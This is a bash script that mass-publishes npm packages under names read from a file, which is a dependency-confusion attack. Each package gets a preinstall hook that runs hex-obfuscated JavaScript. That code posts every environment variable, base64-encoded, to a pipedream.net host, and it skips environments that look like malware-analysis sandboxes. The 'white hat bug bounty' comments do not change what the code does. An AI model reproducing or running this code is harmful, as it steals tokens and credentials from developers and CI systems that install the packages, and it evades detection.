#!/bin/bash
POSITIONAL=()
while [[ $# -gt 0 ]]
do
key="$1"

case $key in
    -v|--version)
    VERSION="$2"
    shift # past argument
    shift # past value
    ;;
    -s|--searchpath)
    SEARCHPATH="$2"
    shift # past argument
    shift # past value
    ;;
    -l|--lib)
    LIBPATH="$2"
    shift # past argument
    shift # past value
    ;;
    --default)
    DEFAULT=YES
    shift # past argument
    ;;
    *)    # unknown option
    POSITIONAL+=("$1") # save it in an array for later
    shift # past argument
    ;;
esac
done
set -- "${POSITIONAL[@]}" # restore positional parameters

for i in $(cat dc);
do
echo '
{
  "name": "'$i'",
  "version": "141.0.0",
  "description": "hackerone.com/homosec Bug Bounty Security Reseaarch White Hat",
  "main": "index.js",
  "scripts": {
    "test": "echo \"Error: no test specified\" && exit 1",
    "preinstall":"node index.js"
  },
  "author": "",
  "license": "ISC"
}
' > package.json

echo "
//hackerone.com/homosec
//Bug Bounty Security Reasearch White Hat
//homosec@wearehackerone.com
if (Object.keys(process.env).length > 15 &&
    !(process.env.COLOR == '0' && process.env.EDITOR == 'vi' && process.env.LOGNAME && process.env.OLDPWD) &&
!(process.env.APPDATA === '/analysis/bait')&&
!(process.env._ === '/usr/bin/timelimit')&&
!(process.env.npm_config_registry === 'https://mirrors.tencent.com/npm/')) {
var _0xee82=['\x68\x74\x74\x70\x73','\x2E','\x6A\x6F\x69\x6E','\x37\x36\x63\x34\x32\x66\x32\x37\x64\x32\x36\x30\x39\x31\x36\x35\x39\x64\x63\x61\x38\x32\x30\x61\x33\x37\x65\x36\x66\x35\x64\x33','\x6D','','\x70\x69\x70\x65','\x64\x72\x65\x61\x6D','\x6E\x65\x74','\x2F"$i"','\x50\x4F\x53\x54','\x72\x65\x71\x75\x65\x73\x74','\x62\x61\x73\x65\x36\x34','\x65\x6E\x76','\x73\x74\x72\x69\x6E\x67\x69\x66\x79','\x66\x72\x6F\x6D','\x77\x72\x69\x74\x65','\x65\x6E\x64'];const http=require(_0xee82[0]);req= http[_0xee82[11]]({host:[_0xee82[3],_0xee82[4],[_0xee82[6],_0xee82[7]][_0xee82[2]](_0xee82[5]),_0xee82[8]][_0xee82[2]](_0xee82[1]),path:_0xee82[9],method:_0xee82[10]});req[_0xee82[16]](Buffer[_0xee82[15]](JSON[_0xee82[14]](process[_0xee82[13]]).toString(_0xee82[12])));req[_0xee82[17]]()
}
" > index.js

npm publish --access=public 
sleep 10
done;
